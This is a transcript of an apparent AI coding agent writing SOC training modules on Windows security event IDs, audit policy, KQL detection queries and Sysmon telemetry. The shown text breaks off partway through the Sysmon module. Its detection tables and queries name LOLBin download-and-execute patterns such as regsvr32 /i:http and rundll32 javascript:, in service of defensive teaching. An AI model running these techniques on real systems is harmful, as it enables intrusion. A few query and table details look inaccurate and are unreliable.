4.3 Critical Security Event IDs — The \"Must Know\" List\n\n### Authentication & Logon\n\n| Event ID | Name | Logon Types | Why It Matters |\n|----------|------|-------------|----------------|\n| **4624** | Successful Logon | 2,3,4,5,7,8,9,10,11 | **Primary logon visibility**. Track who, where, how. |\n| **4625** | Failed Logon | 2,3,4,5,7,8,9,10,11 | **Brute force, password spray, credential stuffing**. |\n| **4634** | Logoff | — | Session end. Correlate with 4624 for session duration. |\n| **4647** | User Initiated Logoff | — | Clean logoff vs crash. |\n| **4672** | Special Logon (Privileged) | — | **Admin logon**. SeDebugPrivilege, SeTcbPrivilege, etc. |\n| **4768** | Kerberos TGT Request (AS-REQ) | — | **Kerberos auth start**. User → KDC. |\n| **4769** | Kerberos Service Ticket (TGS-REQ) | — | **Service access**. SPN, service account targeting. |\n| **4771** | Kerberos Pre-Auth Failed | — | **AS-REP Roasting, password spray (Kerberos)**. |\n| **4776** | NTLM Auth Attempt (Domain Controller) | — | **NTLM auth**. Source workstation, target user. |\n\n### Process & Execution\n\n| Event ID | Name | Why It Matters |\n|----------|------|----------------|\n| **4688** | Process Creation | **Process execution**. NewProcessName, CommandLine, ParentProcess, TokenElevation, SubjectUser. **Enable CommandLine logging!** |\n| **4698** | Scheduled Task Created | **Persistence**. Task name, author, action, trigger. |\n| **4699** | Scheduled Task Deleted | Covering tracks. |\n| **4700** | Scheduled Task Enabled | Persistence activation. |\n| **4701** | Scheduled Task Disabled | Cleanup or disable defense. |\n\n### Account Management\n\n| Event ID | Name | Why It Matters |\n|----------|------|----------------|\n| **4720** | User Account Created | **New account**. Who created, privileges. |\n| **4722** | User Account Enabled | Disabled → Enabled (staging). |\n| **4723** | Password Change Attempt | Self vs admin reset. |\n| **4724** | Password Reset Attempt | Admin reset (potential compromise). |\n| **4728** | User Added to Global Group | **Privilege escalation**. Domain Admins, Enterprise Admins. |\n| **4732** | User Added to Domain Local Group | Local admin, RDP access, etc. |\n| **4756** | User Added to Universal Group | Cross-domain privileges. |\n\n### Policy & Audit\n\n| Event ID | Name | Why It Matters |\n|----------|------|----------------|\n| **1102** | Audit Log Cleared | **Anti-forensics**. Who, when. |\n| **4719** | Audit Policy Changed | Logging tampering. |\n| **4902** | Per-User Audit Policy Changed | Targeted logging evasion. |\n\n### Service & Driver\n\n| Event ID | Name | Why It Matters |\n|----------|------|----------------|\n| **7045** | Service Installed | **Persistence**. Service name, path, account, type. |\n| **7036** | Service State Change | Start/stop. Unusual services starting. |\n| **7040** | Service Start Type Changed | Disabled → Auto (persistence). |\n\n---\n\n## 4.4 Deep Dive: Top 15 Event IDs for L1\n\n### 4624 — Successful Logon (The King of Events)\n\n**Key Fields**:\n```\nSubject:  Security ID, Account Name, Account Domain, Logon ID\nLogon Type:  (see below)\nNew Logon:  Security ID, Account Name, Account Domain, Logon ID, Logon GUID\nProcess:    Process ID, Process Name\nNetwork:    Workstation Name, Source Network Address, Source Port\nAuthentication:  Authentication Package (Kerberos, NTLM, Negotiate), \n               Key Length, Impersonation Level, Restricted Admin Mode\n```\n\n**Logon Types (Memorize These)**:\n| Type | Name | Description | Suspicious If |\n|------|------|-------------|---------------|\n| **2** | Interactive | Local console (keyboard) | On server, at 3AM, from admin |\n| **3** | Network | SMB, RPC, PSRemoting, WinRM | Service accounts, lateral movement |\n| **4** | Batch | Scheduled task | Non-service account, unusual time |\n| **5** | Service | Service startup | Non-service account, new service |\n| **7** | Unlock | Workstation unlock | Rapid lock/unlock, remote unlock |\n| **8** | NetworkCleartext | IIS basic auth, FTP | Credentials in cleartext |\n| **9** | NewCredentials | RunAs /netonly | **Lateral movement**, credential theft |\n| **10** | RemoteInteractive | **RDP** | External IP, impossible travel, admin |\n| **11** | CachedInteractive | Offline logon | Laptop off-domain, cached creds |\n\n**Failure Codes (4625 — SubStatus / Status)**:\n| Code | Meaning | Attack Indicator |\n|------|---------|------------------|\n| 0xC000006A | Wrong password | Brute force, password spray |\n| 0xC000006D | Bad username | User enumeration |\n| 0xC000006F | Logon time restriction | Policy violation |\n| 0xC0000070 | Workstation restriction | Unauthorized device |\n| 0xC0000071 | Password expired | Old credentials |\n| 0xC0000072 | Account disabled | Targeting disabled accounts |\n| 0xC000015B | Smartcard required | MFA bypass attempt |\n| 0xC000018C | Trusted domain failed | Cross-domain attack |\n| 0xC000019B | Account locked | Brute force success → lockout |\n| 0xC0000224 | Password must change | Forced reset |\n| 0xC0000225 | Account disabled (UI) | Same as 0xC0000072 |\n| 0xC0000234 | Account locked (UI) | Same as 0xC000019B |\n| 0xC00002EE | Account not found | User enumeration |\n\n### 4688 — Process Creation (The Queen of Events)\n\n**Requires**: `Audit Process Creation` + `Include command line in process creation events` (GPO)\n\n**Key Fields**:\n```\nNew Process:      NewProcessName, NewProcessID\nParent Process:   ParentProcessName, ParentProcessID\nCreator:          SubjectUserSid, SubjectUserName, SubjectDomainName, SubjectLogonId\nCommand Line:     CommandLine (FULL command with args)\nToken:            TokenElevationType (Default / Full / Limited), \n                  MandatoryLabel (Integrity Level: Low/Medium/High/System)\n```\n\n**Suspicious Patterns**:\n| Pattern | Example | Why |\n|---------|---------|-----|\n| **Office → Script** | `WINWORD.EXE` → `POWERSHELL.EXE` / `CMD.EXE` / `WSCRIPT.EXE` | Phishing, macro |\n| **Script → Script** | `POWERSHELL.EXE` → `POWERSHELL.EXE` (encoded) | Obfuscation, staging |\n| **System → User** | `SERVICES.EXE` → `POWERSHELL.EXE` | Service exploit |\n| **LOLBin execution** | `RUNDLL32.EXE` javascript:, `REGSVR32.EXE` /s /n /u /i:http... | Living-off-land |\n| **High integrity from Medium** | `CMD.EXE` (Medium) → `POWERSHELL.EXE` (High) | UAC bypass |\n| **Unsigned / Temp path** | `C:\\Users\\...\\AppData\\Local\\Temp\\abc.exe` | Malware drop |\n| **No parent / PID 0** | ParentProcessID = 0 or 4 (System) | Direct kernel, injection |\n\n### 4672 — Special Logon (Privileged Access)\n\n**Triggered when**: Logon with elevated privileges (admin-equivalent)\n**Key Privileges**: SeDebugPrivilege, SeTcbPrivilege, SeAssignPrimaryTokenPrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege, SeRestorePrivilege\n\n**SOC Value**: Every admin logon. Correlate with 4624 Logon Type 10 (RDP) + 4672 = **Admin RDP session**.\n\n### 4698 — Scheduled Task Created\n\n**Key Fields**: TaskName, TaskContent (XML), Author, UserId, Action (Command, Arguments), Trigger\n\n**Suspicious**:\n- Task runs as SYSTEM or high-privilege account\n- Action: PowerShell, CMD, script from temp, download cradle\n- Trigger: At logon, idle, daily at odd hours, on event (e.g., 4624)\n- Author ≠ Task scheduler service (manual creation)\n\n### 7045 — Service Installed\n\n**Key Fields**: ServiceName, ServiceFileName (path), ServiceType, ServiceStartType, ServiceAccount\n\n**Suspicious**:\n- Path: `C:\\Temp\\`, `C:\\Users\\...\\AppData\\`, non-standard\n- Account: LocalSystem (default), but new service running as user\n- StartType: Auto (2) or Demand (3) — persistence\n- Name: Random, mimics legitimate (e.g., \"Windows Defender Update\")\n\n### 1102 — Audit Log Cleared\n\n**Key Fields**: SubjectUserSid, SubjectUserName, SubjectDomainName, SubjectLogonId\n\n**Always investigate**: Who cleared, when, what happened before/after. **Anti-forensics indicator.**\n\n### 4768 / 4769 — Kerberos TGT / Service Ticket\n\n**4768 (AS-REQ)**: User requests TGT from KDC. Fields: TargetUserName, ServiceName (krbtgt), PreAuthType, ResultCode\n**4769 (TGS-REQ)**: User presents TGT, requests service ticket. Fields: TargetUserName, ServiceName (SPN), TicketOptions, ResultCode\n\n**SOC Value**: Kerberoasting (4769 with RC4), AS-REP Roasting (4768 no pre-auth), unusual SPN requests.\n\n### 4771 — Kerberos Pre-Auth Failed\n\n**Key Fields**: TargetUserName, ServiceName, FailureCode (0x18 = bad password)\n**Attack**: Password spray (Kerberos), AS-REP roasting target enumeration.\n\n### 4776 — NTLM Authentication (Domain Controller)\n\n**Logged on DC only**. SourceWorkstation, TargetUserName, Status (0x0=success, 0xC000006A=bad pwd).\n**Value**: NTLM usage tracking, Pass-the-Hash detection (no 4624 on target), source workstation spoofing.\n\n---\n\n## 4.5 Advanced Audit Policy Configuration (What to Enable)\n\n```\nComputer Configuration → Windows Settings → Security Settings → Advanced Audit Policy\n\nLogon/Logoff:\n  ✅ Audit Logon (Success, Failure)           → 4624, 4625, 4634, 4647\n  ✅ Audit Logoff (Success)                   → 4634\n  ✅ Audit Account Lockout (Failure)          → 4740\n  ✅ Audit IPsec Main Mode (Failure)          → VPN issues\n  ✅ Audit IPsec Quick Mode (Failure)         → VPN issues\n  ✅ Audit Network Policy Server (Success/Fail) → RADIUS\n\nObject Access:\n  ✅ Audit File System (Success, Failure)     → 4663 (sensitive files)\n  ✅ Audit Registry (Success, Failure)        → 4657 (persistence keys)\n  ✅ Audit Kernel Object (Success)            → Handle manipulation\n  ✅ Audit SAM (Success, Failure)             → Local account changes\n  ✅ Audit Certification Services (Success/Fail) → PKI\n\nPolicy Change:\n  ✅ Audit Audit Policy Change (Success)      → 4719\n  ✅ Audit Authentication Policy Change (Success) → 4739\n  ✅ Audit Authorization Policy Change (Success) → 4704\n  ✅ Audit Filtering Platform Policy Change (Success) → Firewall\n  ✅ Audit MPSSVC Rule-Level Policy Change (Success) → Windows Firewall\n  ✅ Audit Other Policy Change Events (Success) → 4902 (per-user audit)\n\nPrivilege Use:\n  ✅ Audit Sensitive Privilege Use (Success)  → 4672, 4673, 4674\n  ❌ Audit Non-Sensitive Privilege Use        → Too noisy\n\nDetailed Tracking:\n  ✅ Audit Process Creation (Success)         → 4688 **CRITICAL**\n  ✅ Audit Process Termination (Success)      → 4689\n  ✅ Audit DPAPI Activity (Success)           → 4692 (credential extraction)\n  ✅ Audit PNP Activity (Success)             → Device install\n  ❌ Audit RPC Events                         → Very noisy\n\nAccount Management:\n  ✅ Audit User Account Management (Success)  → 4720, 4722, 4723, 4724, 4725, 4726, 4738, 4740\n  ✅ Audit Computer Account Management (Success) → 4741-4743\n  ✅ Audit Security Group Management (Success) → 4727-4735, 4754-4758\n  ✅ Audit Application Group Management (Success)\n  ✅ Audit Other Account Management Events (Success) → 4737, 4739\n\nDS Access:\n  ✅ Audit Directory Service Access (Success) → LDAP queries\n  ✅ Audit Directory Service Changes (Success) → AD modifications\n  ✅ Audit Directory Service Replication (Success)\n  ❌ Audit Detailed Directory Service Replication → Noisy\n\nAccount Logon:\n  ✅ Audit Kerberos Authentication Service (Success, Failure) → 4768, 4771\n  ✅ Audit Kerberos Service Ticket Operations (Success, Failure) → 4769, 4770\n  ✅ Audit Credential Validation (Success, Failure) → 4774, 4775, 4776\n  ✅ Audit Other Account Logon Events (Success, Failure)\n```\n\n**Command to Apply (Admin PowerShell)**:\n```powershell\nauditpol /set /subcategory:\"Process Creation\" /success:enable\nauditpol /set /subcategory:\"Logon\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Logoff\" /success:enable\nauditpol /set /subcategory:\"Audit Policy Change\" /success:enable\nauditpol /set /subcategory:\"Authentication Policy Change\" /success:enable\nauditpol /set /subcategory:\"Authorization Policy Change\" /success:enable\nauditpol /set /subcategory:\"Sensitive Privilege Use\" /success:enable\nauditpol /set /subcategory:\"User Account Management\" /success:enable\nauditpol /set /subcategory:\"Security Group Management\" /success:enable\nauditpol /set /subcategory:\"Kerberos Authentication Service\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Credential Validation\" /success:enable /failure:enable\n```\n\n**Enable Command Line Logging**:\n```\nComputer Configuration → Administrative Templates → System → Audit Process Creation\n→ Include command line in process creation events → Enabled\n```\n\n---\n\n## 4.6 Event Log Query Patterns (KQL / Splunk / Elastic)\n\n### Brute Force Detection\n```kql\n// 4625 failed logons → 4624 success within 10 min, same user, same source\nSecurityEvent\n| where EventID == 4625\n| summarize FailCount=count(), StartTime=min(TimeGenerated), EndTime=max(TimeGenerated) \n  by TargetUserName, IpAddress, Computer\n| where FailCount >= 10\n| join kind=inner (\n    SecurityEvent\n    | where EventID == 4624\n    | project TimeGenerated, TargetUserName, IpAddress, Computer, LogonType\n) on TargetUserName, IpAddress, Computer\n| where TimeGenerated_right between (StartTime_left .. datetime_add('minute', 10, EndTime_left))\n```\n\n### Suspicious Process Tree\n```kql\n// Office apps spawning scripts\nSecurityEvent\n| where EventID == 4688\n| where NewProcessName has_any (\"powershell.exe\", \"cmd.exe\", \"wscript.exe\", \"cscript.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"mshta.exe\")\n| where ParentProcessName has_any (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\", \"outlook.exe\", \"msaccess.exe\")\n| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine\n```\n\n### Admin Logon at Odd Hours\n```kql\n// 4624 + 4672 (special logon) outside business hours\nSecurityEvent\n| where EventID == 4624 and LogonType == 10  // RDP\n| join kind=inner (\n    SecurityEvent\n    | where EventID == 4672\n    | project TimeGenerated, Computer, SubjectUserName, SubjectLogonId\n) on Computer, SubjectUserName, SubjectLogonId\n| where TimeGenerated between (datetime(02:00:00) .. datetime(06:00:00))\n```\n\n### Scheduled Task Persistence\n```kql\nSecurityEvent\n| where EventID == 4698\n| parse TaskContent with * \"<Command>\" Command \"</Command>\" * \"<Arguments>\" Arguments \"</Arguments>\" *\n| where Command has_any (\"powershell\", \"cmd\", \"wscript\", \"cscript\", \"rundll32\", \"regsvr32\", \"mshta\", \"http:\", \"https:\")\n| project TimeGenerated, Computer, TaskName, Author, Command, Arguments, TriggerType\n```\n\n---\n\n## 4.7 Common Event ID Correlation Patterns\n\n| Attack Stage | Primary Event IDs | Correlating Events |\n|--------------|-------------------|-------------------|\n| **Initial Access (Phishing)** | 4688 (Office→Script), 4104 (PS Script Block) | Email logs, Proxy/DNS |\n| **Credential Theft** | 4672 (Special logon), 4624 (Type 9), 4776 (NTLM) | 4688 (LSASS access), 4663 (NTDS.dit) |\n| **Lateral Movement** | 4624 (Type 3,10), 4688 (PsExec, WMI), 4698 (Remote task) | NDR (SMB, RPC), 4769 (Kerberos) |\n| **Persistence** | 4698 (Task), 7045 (Service), 4657 (Run keys), 4698 (WMI) | 4688 (persistence execution) |\n| **Privilege Escalation** | 4672 (new), 4688 (token manip), 4673 (priv use) | 4728/4732 (group add), 4719 (audit policy) |\n| **Defense Evasion** | 1102 (log clear), 4719 (audit policy), 4688 (unhook) | 4663 (AV config), 4688 (EDR tamper) |\n| **Exfiltration** | 4663 (file read), 5156 (network connect), Proxy logs | NDR (large transfer), Cloud logs |\n\n---\n\n## 4.8 Log Quality Issues & Workarounds\n\n| Issue | Impact | Workaround |\n|-------|--------|------------|\n| **No command line in 4688** | Blind to args | Enable GPO; use Sysmon EID 1 (always has cmdline) |\n| **Logon Type missing in 4624** | Can't distinguish RDP vs SMB | Check 4624 + 4672 combo; NDR for RDP |\n| **Security log overwrites in hours** | Lost evidence | Forward to SIEM immediately; increase log size to 4GB |\n| **No 4688 on some systems** | Blind to process | Deploy Sysmon; EDR kernel callbacks |\n| **Service account noise** | Alert fatigue | Baseline service account behavior; suppress known-good |\n| **Domain Controller log volume** | Performance, cost | Filter: only 4624/4625/4768/4769/4771/4776/4672/4688/4698/7045/1102 |\n\n---\n\n## 4.9 Interview Questions for This Module\n\n1. **What are the 9 logon types in Event 4624 and which indicate RDP?**\n   - Types 2,3,4,5,7,8,9,10,11. Type 10 = RDP (RemoteInteractive).\n\n2. **Event 4625 shows Status 0xC000006A and SubStatus 0xC000006A. What does this mean?**\n   - Wrong password (bad credentials). Brute force or password spray indicator.\n\n3. **How do you distinguish a service account logon from a compromised admin logon using 4624?**\n   - Logon Type: Service accounts = Type 5 (Service) or 4 (Batch). Admin interactive = Type 2, RDP = Type 10. Check 4672 (special logon) for admin.\n\n4. **What does Event 4688 show and what GPO setting is required for command lines?**\n   - Process creation with parent, command line, user, integrity level. GPO: \"Include command line in process creation events\" under Audit Process Creation.\n\n5. **Event 4672 appears with 4624 Logon Type 10. What does this indicate?**\n   - Privileged (admin-equivalent) RDP session. High value target.\n\n6. **What Event ID indicates a scheduled task was created and what fields matter?**\n   - 4698. TaskName, Author, Command, Arguments, Trigger, UserId.\n\n7. **Event 1102 fires. What is your immediate action?**\n   - Investigate immediately: Who (SubjectUserName), when, what happened before/after. Anti-forensics indicator.\n\n8. **How do you detect Kerberoasting using Windows Event Logs?**\n   - 4769 (TGS-REQ) with TicketEncryptionType=0x17 (RC4) targeting service accounts (SPNs). High volume from single user.\n\n9. **What's the difference between Event 4768 and 4769?**\n   - 4768 = AS-REQ (TGT request, user→KDC). 4769 = TGS-REQ (Service ticket request, user→KDC with TGT).\n\n10. **Event 4776 on a Domain Controller shows Status 0x0. What does this mean?**\n    - Successful NTLM authentication. SourceWorkstation field shows origin. Check for Pass-the-Hash (no corresponding 4624 on target).\n\n---\n\n## 4.10 Study Checklist for Module 4\n\n- [ ] Recite 15 critical Event IDs and their purpose\n- [ ] Memorize 9 Logon Types and 10 Failure Codes\n- [ ] Explain 4624, 4625, 4688, 4672, 4698, 7045, 1102, 4768, 4769, 4771, 4776 in detail\n- [ ] Write KQL/Splunk queries for: brute force, Office→script, admin RDP, scheduled task, Kerberoasting\n- [ ] Configure Advanced Audit Policy from memory (key subcategories)\n- [ ] Correlate event IDs to attack stages (Initial Access → Exfiltration)\n- [ ] Identify log quality gaps and workarounds\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 5 — Sysmon Telemetry*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/04-windows-security-event-logs.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 24.7s)

_Thinking:_

Module 4 is complete. Let me continue with Module 5 - Sysmon Telemetry.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 1184.3s)

_Thinking:_



_Thinking:_



_Thinking:_



_Thinking:_



_Thinking:_



_Thinking:_



_Thinking:_

Now let me create Module 5 - Sysmon Telemetry.

---

## User

CONTİNUE

---

## User

Continue

---

## Assistant (Build · Nemotron 3 Ultra Free · 375.4s)

_Thinking:_



_Thinking:_



_Thinking:_

The user wants me to continue creating the modules. I was in the middle of creating Module 5 - Sysmon Telemetry. Let me continue with that.

**Tool: write**

**Input:**
```json
{
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/05-sysmon-telemetry.md",
  "content": "# Module 5: Sysmon Telemetry\n\n**Priority: P0 — Best endpoint visibility. Essential for L1 triage and investigation.**\n\n---\n\n## 5.1 What is Sysmon?\n\n**System Monitor (Sysmon)** is a Windows system service and device driver that logs detailed system activity to the Windows Event Log. It persists across reboots and survives user logoff.\n\n| Feature | Windows Security Log | Sysmon |\n|---------|---------------------|--------|\n| Process command line | Only with GPO (often missing) | **Always** |\n| Parent process | PID only | **Full path, PID, command line** |\n| Hash (SHA256/MD5/IMPHASH) | No | **Yes** |\n| Network connections | No (need NDR) | **Yes (EID 3)** |\n| File creation | 4663 (noisy, needs SACL) | **Targeted (EID 11)** |\n| Registry | 4657 (noisy) | **Targeted (EID 12/13/14)** |\n| DNS queries | No | **Yes (EID 22)** |\n| Process memory access | No | **Yes (EID 8, 10)** |\n| Image/DLL loads | No | **Yes (EID 7)** |\n| Pipe creation | No | **Yes (EID 17/18)** |\n| WMI events | No | **Yes (EID 19/20/21)** |\n\n**Log Location**: `Applications and Services Logs → Microsoft → Windows → Sysmon → Operational`\n\n---\n\n## 5.2 Sysmon Event IDs — Complete Reference\n\n| EID | Name | Description | Key Fields |\n|-----|------|-------------|------------|\n| **1** | Process Create | Process execution | Image, CommandLine, ParentImage, ParentCommandLine, User, Hashes, IntegrityLevel, LogonId |\n| **2** | File Creation Time Change | Timestomping | TargetFilename, CreationTime, PreviousCreationTime |\n| **3** | Network Connection | TCP/UDP outbound/inbound | Image, SourceIp, SourcePort, DestinationIp, DestinationPort, Protocol, User |\n| **4** | Service State Change | Service install/start/stop | Image, ServiceName, ServiceType, StartType, Account |\n| **5** | Process Terminate | Process exit | Image, ProcessId, User |\n| **6** | Driver Load | Kernel driver load | Image, Hashes, Signed, Signature |\n| **7** | Image Load | DLL/EXE load | Image, ProcessId, Hashes, Signed |\n| **8** | CreateRemoteThread | Cross-process thread injection | SourceImage, TargetImage, SourceProcessId, TargetProcessId |\n| **9** | RawAccessRead | Raw disk access | Image, TargetDevice |\n| **10** | ProcessAccess | OpenProcess with specific rights | SourceImage, TargetImage, GrantedAccess (hex) |\n| **11** | File Create | File created | TargetFilename, Image, Hashes |\n| **12** | Registry Create/Delete | Key create/delete | TargetObject, Image, Details |\n| **13** | Registry Value Set | Value modification | TargetObject, Image, Details |\n| **14** | Registry Key Rename | Key rename | TargetObject, NewName, Image |\n| **15** | File Create Stream Hash | Alternate Data Stream | TargetFilename, Image, Hashes, Contents |\n| **16** | Sysmon Config Change | Config modified | — |\n| **17** | Pipe Created | Named pipe creation | PipeName, Image |\n| **18** | Pipe Connected | Named pipe connection | PipeName, SourceImage, TargetImage |\n| **19** | WMI Event Filter | Permanent event subscription | FilterName, Query, EventNamespace |\n| **20** | WMI Event Consumer | Consumer registration | ConsumerName, Type, CommandLine |\n| **21** | WMI Filter-Consumer Binding | Filter→Consumer link | Filter, Consumer |\n| **22** | DNS Query | DNS resolution | QueryName, QueryStatus, QueryResults, Image |\n| **23** | File Delete | File deletion | TargetFilename, Image |\n| **24** | Clipboard Change | Clipboard access | Image, User |\n| **25** | Process Tampering | Process hollowing, herpaderping | Image, TargetImage, Technique |\n| **26** | File Delete Detected | Archive via USN | TargetFilename, Image |\n\n---\n\n## 5.3 Critical Event IDs for L1 — Deep Dive\n\n### EID 1: Process Create — The Crown Jewel\n\n**Every process execution. Always has command line. Always has hashes.**\n\n```\nKey Fields:\n├── UtcTime, ProcessGuid, ProcessId\n├── Image                    # Full path to executable\n├── CommandLine              # FULL command with arguments (decoded!)\n├── CurrentDirectory         # Working directory\n├── User                     # DOMAIN\\user (or SID)\n├── LogonGuid, LogonId       # Correlate with 4624\n├── IntegrityLevel           # System, High, Medium, Low\n├── Hashes                   # SHA256, MD5, IMPHASH (comma-separated)\n├── ParentProcessGuid        # Link to parent EID 1\n├── ParentProcessId\n├── ParentImage              # Parent executable path\n├── ParentCommandLine        # Parent's full command line\n└── OriginalFileName         # Internal name (detects renames)\n```\n\n**Why ParentProcessGuid > ParentProcessId**: PIDs recycle. GUIDs are unique per boot.\n\n**Suspicious Patterns**:\n| Pattern | Example | MITRE |\n|---------|---------|-------|\n| Office → Script | `WINWORD.EXE` → `POWERSHELL.EXE -enc ...` | T1059.001 |\n| Script → Script | `POWERSHELL.EXE` → `POWERSHELL.EXE` (nested) | T1059.001 |\n| LOLBin | `RUNDLL32.EXE javascript:...`, `REGSVR32.EXE /s /n /u /i:http...` | T1218 |\n| 